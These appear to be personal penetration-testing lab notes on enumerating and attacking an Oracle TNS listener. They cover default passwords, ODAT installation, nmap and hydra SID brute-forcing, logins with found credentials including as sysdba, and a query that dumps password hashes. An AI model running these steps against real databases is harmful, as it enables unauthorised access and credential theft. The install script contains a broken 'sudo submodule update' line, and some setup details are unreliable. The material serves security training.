- Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks
- supports IPX/SPX and TCP/IP protocols

### Default Configuration

- listens for incoming connections on the TCP/1521
- By default, Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g
- listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords
- listener will use Oracle Net Services to encrypt the communication between the client and the server.
- configuration files are tnsnames.ora and listener.ora and are located in the ORACLE_HOME/network/admin directories
- Oracle 9 has a default password **CHANGE_ON_INSTALL**
- Oracle 10 has no default password set
- Oracle DBSNMP service also uses a default password, **dbsnmp**
- many organizations still use the finger service together with Oracle
- Each database or service has a unique entry in the tnsnames.ora file, containing the necessary information for clients to connect to the service
- listener.ora file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance
- Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper directory, and it contains the names of PL/SQL packages or types that should be excluded from execution


### Oracle Database Attacking Tool

Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

Below is a script to download the tool and it's dependencies

```
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

System Identifier, **SIDs**, are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.


**NMAP**
```
sudo nmap -p1521 -sV 10.129.205.19 --open
```

**NMAP - SID Bruteforcing**
```
sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
```


**Use odat.py to enumerate the oracle db**
```
./odat.py all -s 10.129.205.19
```

Credentials found - scott:tiger

**Use sqlplus to connect to Oracle db**
```
sqlplus scott/tiger@10.129.205.19/XE;
```

If you come across the following error...
```
sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
```

...execute the below:
```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

**Oracle RDBMS Interaction**
```
select table_name from all_tables;
```

**ORACLE RDBMS Enumeration - Logging in as Sys Admin**
(substitute scott:tiger for robin:robin)
```
sqlplus robin/robin@10.129.205.19/XE as sysdba
```

**Extracting Password Hashes**
```
select name, password from sys.user$;
```

### Questions

Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
```
```

Nmap
![[nmap_oracle_tns.png]]

Simply wordlist does not work
![[Pasted image 20230813045715.png]]

Found 4 legit SIDS
```
sudo hydra -L /usr/share/wordlists/sids-oracle.txt -t 32 -s 1521 10.129.205.19 oracle-sid
```

![[Pasted image 20230813061046.png]]

Running the following attack, but getting "Unknown service: oracle"
![[Pasted image 20230816230407.png]]

NSE oracle-sid-brute script
```
sudo nmap -p1521 -sV 10.129.45.163 --open --script oracle-sid-brute -Pn
```

![[Pasted image 20230816230543.png]]

Install sqlplus, following the instructions in the below links:
https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener

[book.hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation)

https://lisandre.com/archives/2164



